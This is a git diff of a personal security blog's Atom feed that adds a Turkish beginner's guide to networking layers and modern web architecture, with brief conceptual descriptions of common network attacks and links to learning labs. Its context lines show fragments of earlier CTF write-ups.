@@ -1,4 +1,404 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-03-24T14:21:33+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">Bir Türk Genci ve Bug Bounty</title><link href="http://localhost:4000/bir-turk-genci-ve-bug-bounty/" rel="alternate" type="text/html" title="Bir Türk Genci ve Bug Bounty" /><published>2025-03-23T00:00:00+03:00</published><updated>2025-03-23T00:00:00+03:00</updated><id>http://localhost:4000/bir-turk-genci-ve-bug-bounty</id><content type="html" xml:base="http://localhost:4000/bir-turk-genci-ve-bug-bounty/"><![CDATA[<p>Bir Türk Gencinin Çabası, Bug Bounty Nedir? Bug Bounty Yol Haritası</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-03-30T14:49:47+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">Temel Network ve Modern Web Mimarisi</title><link href="http://localhost:4000/temel-network-ve-modern-web-mimarisi/" rel="alternate" type="text/html" title="Temel Network ve Modern Web Mimarisi" /><published>2025-03-30T00:00:00+03:00</published><updated>2025-03-30T00:00:00+03:00</updated><id>http://localhost:4000/temel-network-ve-modern-web-mimarisi</id><content type="html" xml:base="http://localhost:4000/temel-network-ve-modern-web-mimarisi/"><![CDATA[<p><br />
+Elimden geldiğince ve öğrendiğim kadarıyla temel ağ yapısından ve modern web mimarisini anlatacağım.</p>
+
+<p><br /></p>
+
+<h2 id="basic-networking---temel-ağ">Basic Networking - Temel Ağ</h2>
+
+<p>Yanlış anladığım yerler veya eksik bilgilerim muhakkak vardır. Gözünüze çarpan veya üzerine eklemek istediğiniz şeyler olursa yazmaktan çekinmeyin lütfen. <code class="language-plaintext highlighter-rouge">Birbirimize destek olarak daha güzel öğreniriz.</code></p>
+
+<p><img src="/assets/img/guide/temel_network/homelander.gif" alt="dontshy" /></p>
+
+<p>Konulara geçmeden önce şunu belirtmeliyim, ben konuları anlatırken internette çok kolay bir şekilde ulaşabileceğiniz terimleri dizip Türkçesini yazıp geçmeyeceğim. Ben nasıl kavradıysam o şekilde anlatmak istiyorum ve bu şekilde konuların daha anlaşılabilir olduğuna inanıyorum. Burada akademik makale yazmıyoruz sonuçta.</p>
+
+<p>Son olarak konuyu öğrendiğim kaynaklardan bahsetmek istiyorum. Bence temel ağ konusu sadece okuyarak anlaması zor bir konu. Görerek öğrenmesinin daha kolay olduğunu düşünüyorum ve internette bu konuda inanılmaz sayıda güzel kaynaklar var.</p>
+
+<p>Benim öncelikli kaynağım ise şu :point_right: <a href="https://youtu.be/3AgDSw0I89A">Mdisec - Web Security 101 0x04</a>
+Bu video ile temel ağ yapısını ve modern web sistemini öğrendim.</p>
+
+<p>Cloudflare’in de güzel bir eğitimi var, buna da bakabilirsiniz. :point_right: <a href="https://www.cloudflare.com/learning/">Learning Center</a></p>
+
+<p>Anlamadığım veya detaya ihtiyacım olduğu noktalarda da yapay zekaya başvurdum.</p>
+
+<p>İşe yarıyabilceğini düşündüğüm farklı birkaç kaynak daha topladım. Burada :point_right: <a href="#derlediğim-farklı-kaynaklar-ve-lablar">Kaynaklar ve Lablar</a></p>
+
+<p>Bu süreçte ortaya çıkan güvenlik açıklarından da ileride bahsediyorum :point_right: <a href="#networkte-ortaya-çıkan-bazı-güvenlik-açıkları">Güvenlik Açıkları</a></p>
+
+<p>Gelelim konumuza, bugün birçok soruya cevap vermeye çalışacağım. Bu sorular kısaca şunlar;</p>
+<ul>
+  <li>
+    <h5 id="osi-katmanları-neler-ve-bu-katmanlarda-neler-oluyor">OSI Katmanları neler ve bu katmanlarda neler oluyor?</h5>
+  </li>
+  <li>
+    <h5 id="bir-internet-sitesine-girene-kadar-yaşananlar-nelerdir">Bir internet sitesine girene kadar yaşananlar nelerdir?</h5>
+  </li>
+  <li>
+    <h5 id="ortalama-bir-web-sitesinin-işleyişi-nasıldır-günümüz-sisteminde">Ortalama bir web sitesinin işleyişi nasıldır? Günümüz sisteminde.</h5>
+  </li>
+  <li>
+    <h5 id="ve-bu-işleyişin-her-bir-kısmından-doğan-zafiyetler-nelerdir">Ve bu işleyişin her bir kısmından doğan zafiyetler nelerdir?</h5>
+  </li>
+</ul>
+
+<p>Her şeyi baştan ele aldığımızda, <strong><code class="language-plaintext highlighter-rouge">OSI (Open Systems Interconnection)</code></strong>  katmanları bize genel işleyişi gösteriyor. Bu katmanların ne olduğunu bilmek bu katmanlarda neler olduğunu bilmek bizim için önemli. Katmanlar üzerinden anlatarak ilerleyeceğim.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Not: Bu katmanların çoğunu wireshark kullanarak bir sunucuya istek yollayıp izleyebilirsiniz.</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="konu-i̇çin-oluşturduğum-görsel">Konu İçin Oluşturduğum Görsel</h3>
+<p><img src="/assets/img/guide/temel_network/workflow.png" alt="workflow" /></p>
+
+<p><br /></p>
+
+<h3 id="physical-layer-fiziksel-katman">Physical Layer (Fiziksel Katman)</h3>
+
+<p>Bu katman basitçe fiziksel bağlantıların yapıldığı katmandır. Ethernet kablosunun bağlanması gibi.
+Fiziksel donanımın başlatılması ilk katmanı aktive eder. Yani bilgisayarı başlattık.</p>
+
+<h3 id="data-link-layer-veri-bağlantı-katmanı-ve-network-layer-ağ-katmanı">Data Link Layer (Veri Bağlantı Katmanı) ve Network Layer (Ağ Katmanı)</h3>
+
+<p>Şimdi A cihazı ve B cihazı olarak yerel ağda iki farklı cihaz düşünelim (Evinizdeki bir bilgisayar ve telefon olarak düşünebilirsiniz bu cihazları).</p>
+<ul>
+  <li>
+    <h5 id="modem--mac-x">Modem : Mac: x</h5>
+  </li>
+  <li>
+    <h5 id="a-cihazı--mac-y">A Cihazı : Mac: y</h5>
+  </li>
+  <li>
+    <h5 id="b-cihazı--mac-z">B Cihazı : Mac: z</h5>
+  </li>
+</ul>
+
+<p>Bu iki katman yerel ağdaki cihazların birbirleriyle iletişimini ve sonrasında nasıl bir IP adresine sahip olduklarını gösteren katmanlardır. Gelelim neler olduğuna.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">MAC (Media Access Control):</code></strong>  Cihazın bilgilerini içeren benzersiz bir adrestir. Her cihazın özeldir ve değiştirilemez.</p>
+
+<p><strong>Layer 2’de</strong>  iletişim MAC bazlıdır. Cihazlar birbirlerinin MAC adreslerini bilmelidirler. 
+Bunu öğrenmeleri için ise  <strong><code class="language-plaintext highlighter-rouge">ARP(Address Resolution Protocol)</code></strong>  devreye girer. ARP ile cihazlar birbirlerinin MAC adresini öğrenirler. Kısaca iki fazlıdır.</p>
+<ul>
+  <li>
+    <h5 id="a-cihazı-tüm-ağa-b-cihazının-kim-olduğunu-sorar">A cihazı tüm ağa B cihazının kim olduğunu sorar.</h5>
+  </li>
+  <li>
+    <h5 id="b-cihazı-da-o-benim-diye-atılır-ve-kendi-mac-adresini-söyler">B cihazı da o benim diye atılır ve kendi MAC adresini söyler.</h5>
+  </li>
+  <li>
+    <h5 id="birbirlerini-bir-kere-tanımaları-yeterlidir-ve-her-cihaz-birbirlerinin-bilgilerini-arp-tablolarında-tutar">Birbirlerini bir kere tanımaları yeterlidir ve her cihaz birbirlerinin bilgilerini <code class="language-plaintext highlighter-rouge">ARP tablolarında</code> tutar.</h5>
+  </li>
+</ul>
+
+<p><strong><code class="language-plaintext highlighter-rouge">DHCP (Dynamic Host Configuration Protocol) ile IP Adresi Alma:</code></strong></p>
+
+<p>DHCP ağ ayarlarını otomatik olarak atayan bir protokoldür.
+Cihaz bir yerel ağda IP almak için tüm yerel ağa bir sinyal yollar. Bu sinyal <strong><code class="language-plaintext highlighter-rouge">DHCP Discover'dır</code></strong> .  DHCP bu sinyale karşılık otomatik ayarlar atar. Bunlar;</p>
+<ul>
+  <li>
+    <h5 id="ip-adresi-10002">IP adresi: 10.0.0.2</h5>
+  </li>
+  <li>
+    <h5 id="gateway-modem-adresi--10001">Gateway, Modem adresi : 10.0.0.1</h5>
+  </li>
+  <li>
+    <h5 id="dns-sunucusu-8888">DNS Sunucusu: 8.8.8.8</h5>
+  </li>
+  <li>
+    <h5 id="subnet-mask--2552552550">Subnet Mask : 255.255.255.0</h5>
+  </li>
+</ul>
+
+<p>Aslında DHCP süreci daha da uzun, iki tarafın birbirini onaylaması gibi durumlar var. Geçiyorum onları temelde IP’yi ve diğer ayarları otomatik nasıl aldığımızı bilmeniz yeterli. Ayrıca bu görevi modem, routerlar yönetir.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Notlar:</code></strong></p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Subnet Mask:</code> Ağ içerisinde yer alan cihazlar kendi aralarında düzenlenir ve aynı ağda oldukları anlaması sağlanır. Aynı ağda bulunan cihazlar birbirleri ile iletişim kurarken bundan faydalanırlar. Daha detaya burada girmeyeceğim fakat. <code class="language-plaintext highlighter-rouge">CIDR gösterimini</code> ve subnet maskı daha detaylı araştırabilirsiniz.</p>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">Subnetting:</code> Ağdaki cihazların farklı işlevleri olabilir, örneğin muhasebecilerin ağı veya satış elemanlarının bağlandıkları ağ gibi. Büyük şirketlerde bu şekilde ayırarak ağı yönetmek ağı daha güvenli ve hızlı hale getirir.</li>
+  <li>Özel IP adresi aralıkları,
+    <ul>
+      <li>
+        <h5 id="10000-----10255255255">10.0.0.0   -&gt; 10.255.255.255</h5>
+      </li>
+      <li>
+        <h5 id="1721600---17231255255">172.16.0.0 -&gt; 172.31.255.255</h5>
+      </li>
+      <li>
+        <h5 id="19216800---192168255255">192.168.0.0 -&gt; 192.168.255.255</h5>
+      </li>
+      <li>
+        <h5 id="127001---127255255255-loopback-adresi">127.0.0.1 -&gt; 127.255.255.255 Loopback adresi</h5>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="4-katman-transport-layer-taşıma-katmanı">4. Katman Transport Layer (Taşıma Katmanı)</h3>
+
+<p>Artık A cihazı ve B cihazı birer IP adresine sahipler.</p>
+<ul>
+  <li>
+    <h5 id="modem--10001---mac-x">Modem : 10.0.0.1 - Mac: x</h5>
+  </li>
+  <li>
+    <h5 id="a--10002---mac-y">A : 10.0.0.2 - Mac: y</h5>
+  </li>
+  <li>
+    <h5 id="b--10003---mac-z">B : 10.0.0.3 - Mac: z</h5>
+  </li>
+</ul>
+
+<p>Verilerin paketlenip taşınma süreci bu katmanda olur. Örneğin bir mesaj bu katmandan gönderilir veya YouTube’a video yükleme süreci aynı şekilde bu katmanla gerçekleşir.
+İki farklı protokol vardır. Bunlar <code class="language-plaintext highlighter-rouge">TCP(Transmission Control Protocol)</code> ve <code class="language-plaintext highlighter-rouge">UDP(User Datagram Protocol)</code>.</p>
+
+<p>UDP’nin özellikleri;</p>
+<ul>
+  <li>
+    <h5 id="i̇stemci-doğrudan-paketi-gönderir-sunucu-paketi-alırsa-alır-almazsa-paket-kaybolur">İstemci doğrudan paketi gönderir. Sunucu paketi alırsa alır almazsa paket kaybolur.</h5>
+  </li>
+  <li>
+    <h5 id="çok-hızlıdır">Çok hızlıdır.</h5>
+  </li>
+  <li>
+    <h5 id="dns-sorgularında-genelde-udp-kullanılır-i̇nternetin-daha-hızlı-yanıt-vermesi-sağlanır">DNS sorgularında genelde UDP kullanılır. İnternetin daha hızlı yanıt vermesi sağlanır.</h5>
+  </li>
+  <li>
+    <h5 id="online-oyunlarda-da-kullanılır">Online oyunlarda da kullanılır.</h5>
+  </li>
+</ul>
+
+<p>TCP’nin özellikleri;</p>
+<ul>
+  <li>
+    <h5 id="veri-aktarımını-daha-garanti-ve-güvenli-hale-getirmek-için-three-way-handshake3lü-el-sıkışma-kullanılır-konunun-ilerisinde-daha-detaylı-anlatacağım">Veri aktarımını daha garanti ve güvenli hale getirmek için <code class="language-plaintext highlighter-rouge">Three Way Handshake(3'lü el sıkışma)</code> kullanılır. Konunun ilerisinde daha detaylı anlatacağım.</h5>
+  </li>
+  <li>
+    <h5 id="paketler-kaybolmaz-tcp-tekrar-yollayabilir">Paketler kaybolmaz. TCP tekrar yollayabilir.</h5>
+  </li>
+</ul>
+
+<p>Artık, bir web sitesine bağlanabiliriz değil mi? Hayır. Öncesinde gerçekleşecek daha birçok olay var. Diğer katmanlara geçmeden onlardan bahsedeyim.</p>
+
+<p><code class="language-plaintext highlighter-rouge">NAT</code>, Yerel ağın IP adresidir. Yerel ağdan çıkan isteklerin internete ulaşması sağlanır. Ve bu IP adresi yerel ağdaki her cihaz için aynıdır. <code class="language-plaintext highlighter-rouge">Bu IP adresi ile cihazlar yerel ağdan dışarı çıkar ve internetle iletişim kurar</code>. Örnek bir adres, 75.85.63.35.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Gateway</code>, yerel ağdan istekler gateway üzerinden internete çıkarlar ve aynı şekilde yerel ağa giriş yaparlar. Gateway giriş ve çıkışların kontrol edildiği noktadır. <code class="language-plaintext highlighter-rouge">Burada ağ istekleri incelenir</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Firewall</code> da gatewaye benzerdir. <code class="language-plaintext highlighter-rouge">Giren çıkan istekleri kontrol eder, bu isteklerin güvenli olup olmadığına</code> bakarak sunucuyu ataklardan korur ve belirli kurallara göre kötü istekleri de engeller. Örneğin bir üniversitenin wi-fi ağında firewall denetimi olabilir. Bazı sitelere girişiniz engellenebilir.</p>
+
+<p>Şimdi <code class="language-plaintext highlighter-rouge">DNS(Domain Name Server)</code> ile devam edelim.
+İsteğimiz, <code class="language-plaintext highlighter-rouge">abc.com</code> adresine gitmek olsun. Fakat burada bir sıkıntımız var. Cihazımız abc.com’un kim olduğunu bilmiyor yani IP adresini bilmiyor. Doğrudan abc.com’a erişemeyiz.</p>
+
+<p>Biz bu isteği yaptığımızda, önce <code class="language-plaintext highlighter-rouge">UDP:53</code> ile <code class="language-plaintext highlighter-rouge">DNS sorgusu</code> yapılır. <code class="language-plaintext highlighter-rouge">"Daha hızlı olduğu için genelde UDP kullanılır fakat TCP ile de bu sorgular gerçekleştirilebilir."</code> Ardından bu web sunucusunun IP adresi bulunur. DHCP’nin bize otomatik verdiği DNS’i hatırlayın <code class="language-plaintext highlighter-rouge">8.8.8.8</code> Önce burada bir sorgu gerçekleşir bulunamazsa sorgu aşağıdaki şekilde devam eder.</p>
+<ul>
+  <li>
+    <h5 id="tld-top-level-domain-com-net-org">TLD (Top-Level Domain): .com, .net, .org</h5>
+  </li>
+  <li>
+    <h5 id="root-dns-en-üst-seviye-dns-sunucuları">Root DNS: En üst seviye DNS sunucuları</h5>
+  </li>
+  <li>
+    <h5 id="recursive-dns-iss-i̇nternet-servis-sağlayıcısı-tarafından-sağlanan-sunucu">Recursive DNS: ISS (İnternet Servis Sağlayıcısı) tarafından sağlanan sunucu</h5>
+  </li>
+  <li>
+    <h5 id="authoritative-dns-web-sitesinin-gerçek-ip-adresini-tutan-sunucu">Authoritative DNS: Web sitesinin gerçek IP adresini tutan sunucu</h5>
+  </li>
+</ul>
+
+<p>IP adresini çözdüğümüzde artık bağlantı kurabiliriz. Örneğin, web sitesini açmak isteyelim. HTTPS ile çalışan bir web sitesi olsun. <code class="language-plaintext highlighter-rouge">HTTPS 443</code> portunda çalışır. Bir istek yolluyoruz ve bu isteği de unutmayın TCP protokolü ile 443 portuna olcak şekilde yolluyoruz. Bu istek firewall’dan geçer ve web sunucusuna ulaşır. Burada <code class="language-plaintext highlighter-rouge">3-lü el sıkışma</code> dediğimiz olay gerçekleşir.</p>
+<ul>
+  <li>
+    <h5 id="syn-ile-isteğimiz-gönderdik">SYN ile isteğimiz gönderdik.</h5>
+  </li>
+  <li>
+    <h5 id="sunucu-syn--ack-ile-isteğimizi-doğrular-ve-bize-kabul-sinyali-yollar-bağlanabilirsin-diye">Sunucu SYN + ACK ile isteğimizi doğrular ve bize kabul sinyali yollar. Bağlanabilirsin diye.</h5>
+  </li>
+  <li>
+    <h5 id="ack-ile-de-bağlantıyı-yerel-ağda-onaylar-ve-veri-alışverişi-başlatılır">ACK ile de bağlantıyı yerel ağda onaylar ve veri alışverişi başlatılır.</h5>
+  </li>
+</ul>
+
+<p>Artık rahatlıkla  web sitesiyle veri alışverişi yapabiliriz.</p>
+
+<p><img src="/assets/img/guide/temel_network/rambow-internet.gif" alt="int" /></p>
+
+<p><br /></p>
+<h3 id="modern-web-sistemi">Modern Web Sistemi</h3>
+<p>Şimdi biraz da modern webe bakalım. Burada vermek istediğim detaylar var.
+Modern bir Web sitesinin temel bileşenleri şu şekilde olabilir,</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Sunucular</code>, öncelikle web sunucusunun birden fazla kopyası oluşturulur. Bunlar aynı sistemin kopyalarıdır. Sistemde oluşabilecek çökmede direkt diğer sistem kullanılabilir.</li>
+  <li>Bir de <code class="language-plaintext highlighter-rouge">web sitesinin</code> içinde olduğu <code class="language-plaintext highlighter-rouge">sunucuların kopyası</code> oluşturulur. Web sitesinin yükü azaltılır.</li>
+  <li><code class="language-plaintext highlighter-rouge">Yedek databaseler</code>, burada bilgiler ani çökmelerde veya veri kaybolmasını önlemek için yedek database sunucuları oluşturulur.</li>
+  <li><code class="language-plaintext highlighter-rouge">Reverse Proxy</code>, istemcilerin doğrudan ana sunucuya bağlanmasını engelleyip, isteği kendisi karşılayan bir ara sunucudur. Bunu bir resepsiyon gibi düşünebilirsiniz:
+    <ul>
+      <li>
+        <h5 id="otele-gelen-müşteri-istemci---kullanıcı-resepsiyona-gidiyor">Otele gelen müşteri (istemci - kullanıcı) resepsiyona gidiyor.</h5>
+      </li>
+      <li>
+        <h5 id="resepsiyon-reverse-proxy-müşterinin-hangi-odaya-gitmesi-gerektiğine-karar-veriyor">Resepsiyon (Reverse Proxy), müşterinin hangi odaya gitmesi gerektiğine karar veriyor.</h5>
+      </li>
+      <li>
+        <h5 id="müşteri-direkt-olarak-odaya-gidemiyor-önce-resepsiyondan-geçmek-zorunda">Müşteri direkt olarak odaya gidemiyor, önce resepsiyondan geçmek zorunda.</h5>
+      </li>
+      <li>
+        <h5 id="yük-dengeleme-load-balancing-gelen-trafiği-birden-fazla-sunucuya-dağıtarak-performansı-artırır">Yük Dengeleme (Load Balancing), Gelen trafiği birden fazla sunucuya dağıtarak performansı artırır.</h5>
+      </li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">Session Servers</code>, kullanıcıların kaydedilen oturum bilgileri de birer yüktür. Farklı bir sunucuda tutmak bu yükü azaltır. Session bilgileri genellikle Redis, Memcached gibi hızlı veri tabanlarında saklanır.</li>
+  <li><code class="language-plaintext highlighter-rouge">CDN</code>, genellikle web sitelerinin statik dosyalarının, javascript vb tutulduğu yerdir.</li>
+  <li><code class="language-plaintext highlighter-rouge">Mail sunucuları</code> olur.</li>
+</ul>
+
+<p>Yukarıda saydıklarım temel olarak bir web sisteminin ağında bulunan sunuculardır. Daha fazlası da eklenebilir. Günümüzde işin içerisine cloud fazlaca kullanılıyor. Ve ` cloud security`  bu nedenle çok önem kazanmakta.</p>
+
+<p><br /></p>
+<h3 id="session-layer-oturum-katmanı">Session Layer (Oturum Katmanı):</h3>
+
+<p>İstemci ve sunucu arasındaki iletişim oturumlarını yönetir.
+Kullanıcı web sitesine bağlandığında, sunucu ile bağlantı başlatılır. Ardından login olursunuz ve sizin için bir session başlatılır. ` Bu session bilgileri cookieleri oluşturur` . Bu sayede bağlantının kopmamasını sağlar. Kullanıcı çıkış yapınca veya bağlantı belirli bir süre boyunca kullanılmazsa, oturum sonlandırılır.</p>
+
+<p><br /></p>
+
+<h3 id="presentation-layer-sunum-katmanı">Presentation Layer (Sunum Katmanı):</h3>
+
+<p>Bu katman, verinin gönderilmeden önce şifrelenmesi, sıkıştırılması ve doğru formatta kodlanmasını sağlar.</p>
+<ul>
+  <li>
+    <h5 id="web-sitesindeki-metinlerin-html-ve-css-olarak-tarayıcıya-sunulması">Web sitesindeki metinlerin, HTML ve CSS olarak tarayıcıya sunulması.</h5>
+  </li>
+  <li>
+    <h5 id="https-bağlantılarında-tls-transport-layer-security-bu-katmanda-çalışır">HTTPS bağlantılarında, <code class="language-plaintext highlighter-rouge">TLS (Transport Layer Security)</code> bu katmanda çalışır.</h5>
+  </li>
+  <li>
+    <h5 id="ssltls-şifrelemesi-ile-web-sitelerinin-güvenli-hale-getirilmesi">SSL/TLS şifrelemesi ile web sitelerinin güvenli hale getirilmesi.</h5>
+  </li>
+  <li>
+    <h5 id="mp3-jpeg-mp4-gibi-dosyaların-kodlanması-ve-çözümlenmesi">MP3, JPEG, MP4 gibi dosyaların kodlanması ve çözümlenmesi.</h5>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="application-layer-uygulama-katmanı">Application Layer (Uygulama Katmanı)</h3>
+
+<p>Bu katman artık web uygulamasının arayüzüne ulaştığımız ve uygulamayı kullandığımız katmandır. Örnek bazı uygulamalar;</p>
+
+<ul>
+  <li>
+    <h5 id="google-chrome-ile-bir-web-sitesine-girmek-httphttps">Google Chrome ile bir web sitesine girmek (HTTP/HTTPS)</h5>
+  </li>
+  <li>
+    <h5 id="gmail-ile-e-posta-göndermek-smtp-imap-pop3">Gmail ile e-posta göndermek (SMTP, IMAP, POP3)</h5>
+  </li>
+  <li>
+    <h5 id="whatsapp-discord-gibi-uygulamalarla-mesajlaşmak-websocket-xmpp">WhatsApp, Discord gibi uygulamalarla mesajlaşmak (WebSocket, XMPP)</h5>
+  </li>
+  <li>
+    <h5 id="spotifydan-müzik-dinlemek-http-streaming-rtsp">Spotify’dan müzik dinlemek (HTTP Streaming, RTSP)</h5>
+  </li>
+  <li>
+    <h5 id="netflixten-video-izlemek-hls-mpeg-dash">Netflix’ten video izlemek (HLS, MPEG-DASH)</h5>
+  </li>
+  <li>
+    <h5 id="dosya-indirmek-veya-yüklemek-ftp-sftp">Dosya indirmek veya yüklemek (FTP, SFTP)</h5>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="önemli-portlar">Önemli Portlar</h3>
+<p><img src="/assets/img/guide/temel_network/ports.webp" alt="ports" /></p>
+
+<p><br /></p>
+
+<h3 id="networkte-ortaya-çıkan-bazı-güvenlik-açıkları">Network’te Ortaya Çıkan Bazı Güvenlik Açıkları</h3>
+<p>Her sistemin mutlaka manipüle edilmesinin bir yolu vardır. Bu katmanlarda da birçok güvenlik açığı doğar. Şimdi sırada bunlardan biraz bahsedelim.</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Wi-Fi Saldırıları</code> 
+Evil Twin Attack, sahte bir Wi-Fi noktası oluşturarak kullanıcıları kandırmak.
+Deauthentication Attack, ullanıcıları ağdan düşürüp sahte bir ağa yönlendirmek.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">ARP Spoofing</code>
+Sahte MAC adresleriyle trafiği yönlendirme
+Saldırgan, sahte bir MAC adresiyle kendisini bir ağ geçidi (gateway) gibi tanıtarak trafiği üzerine çeker.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">BGP Hijacking (Border Gateway Protocol Saldırısı) </code>
+Saldırgan, yanlış yönlendirme bilgileri yayarak internet trafiğini kendi yönettiği sunuculara çeker.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">IP Spoofing</code> 
+Bir saldırgan, kimliğini gizlemek veya saldırıları daha etkili hale getirmek için sahte bir IP adresi kullanabilir. DDoS saldırılarında sahte IP’lerle hedefi çökertebilir.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">TCP SYN Flood</code>
+Saldırgan, sürekli SYN paketleri göndererek sunucunun kaynaklarını tüketir ve sistemi çökertir.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">UDP Spoofing </code>
+Saldırgan, sahte UDP paketleri göndererek hedefi yanıltır ve trafiği şişirir.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Man-in-the-Middle (MitM)</code>
+Saldırgan, istemci ile sunucu arasına girerek trafiği dinler ve değiştirir.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Zayıf Şifreleme Algoritmaları</code>
+MD5, SHA-1 gibi eski ve kırılabilir algoritmalar kullanmak.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">DNS Cache Poisoning (DNS Zehirleme)</code>
+Saldırgan, DNS sunucusunu yanlış yönlendirerek kullanıcıları sahte sitelere gönderir.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">DDoS (Distributed Denial of Service)</code>
+Aşırı Yükleme Saldırısı, hedefe aşırı trafik göndererek hizmeti çökertir.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Bazı OWASP 10 açıkları, CSRF, XSS, SQLi gibi.</code></p>
+  </li>
+</ul>
+
+<p><br />
+<br /></p>
+
+<p><strong>Okuduğunuz için teşekkür ederim, umarım konuyu anlamanıza yardımım dokunmuştur.  Bir sonraki konuda görüşmek üzere.</strong></p>
+
+<p><img src="/assets/img/guide/temel_network/peace-out.gif" alt="peaceout" /></p>
+
+<h3 id="derlediğim-farklı-kaynaklar-ve-lablar">Derlediğim Farklı Kaynaklar ve Lablar</h3>
+
+<ul>
+  <li><a href="https://www.btkakademi.gov.tr/portal/course/temel-ag-teknolojileri-14711">BTKakademi - Temel Ağ Teknolojileri</a></li>
+  <li><a href="https://medium.com/@mehmetozanguven/modern-web-mimarisi-be901b663f5f">Modern Web Mimarisi - @mehmetozanguven</a></li>
+  <li><a href="https://acropolium.com/blog/modern-web-app-architecture/">Modern Web App Architecture</a></li>
+  <li><a href="https://www.geeksforgeeks.org/basics-computer-networking/">Basics Computer Networking - geeksforgeeks</a></li>
+  <li><a href="https://www.w3schools.com/cybersecurity/cybersecurity_networking.php">Cybersecurity Networking - w3schools</a></li>
+  <li><a href="https://www.ibm.com/think/topics/networking">Networking - ibm</a></li>
+</ul>
+
+<p><strong><code class="language-plaintext highlighter-rouge">LABS</code></strong></p>
+<ul>
+  <li><a href="https://networklessons.com/labs/network-fundamentals-lab-1">Network Fundamentals Lab - networklessons</a></li>
+  <li><a href="https://tryhackme.com/module/network-fundamentals">Network Fundamentals - TryHackMe</a></li>
+  <li><a href="https://tryhackme.com/module/networking">Networking - TryHackMe</a></li>
+  <li><a href="https://tryhackme.com/room/introtonetworking">Intro to Network - TryHackMe</a></li>
+</ul>
+
+<p><br />
+<br />
+<br />
+<br />
+<br />
+<br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="basic_network, modern-web, cyber-security" /><summary type="html"><![CDATA[Elimden geldiğince ve öğrendiğim kadarıyla temel ağ yapısından ve modern web mimarisini anlatacağım.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/HTTP-.gif" /><media:content medium="image" url="http://localhost:4000/assets/img/HTTP-.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Bir Türk Genci ve Bug Bounty</title><link href="http://localhost:4000/bir-turk-genci-ve-bug-bounty/" rel="alternate" type="text/html" title="Bir Türk Genci ve Bug Bounty" /><published>2025-03-23T00:00:00+03:00</published><updated>2025-03-23T00:00:00+03:00</updated><id>http://localhost:4000/bir-turk-genci-ve-bug-bounty</id><content type="html" xml:base="http://localhost:4000/bir-turk-genci-ve-bug-bounty/"><![CDATA[<p>Bir Türk Gencinin Çabası, Bug Bounty Nedir? Bug Bounty Yol Haritası</p>
 
 <p><br /></p>
 
@@ -1283,295 +1683,4 @@ I hope you liked my article. See you in my other articles:hand:</p>]]></content>
 
 <p>It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="web, idor, authentication" /><summary type="html"><![CDATA[Check out our new cloud service, Authentication Anywhere. Can you find other user’s secrets?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/neighbour.png" /><media:content medium="image" url="http://localhost:4000/assets/img/neighbour.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - The Marketplace</title><link href="http://localhost:4000/tryhackme-the-marketplace/" rel="alternate" type="text/html" title="TryHackMe - The Marketplace" /><published>2023-05-11T00:00:00+03:00</published><updated>2023-05-11T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-the-marketplace</id><content type="html" xml:base="http://localhost:4000/tryhackme-the-marketplace/"><![CDATA[<p>Can you take over The Marketplace’s infrastructure?</p>
-
-<p>This is a medium level machine and looking at the tags we will be focusing on web, xss, docker and sqli.</p>
-
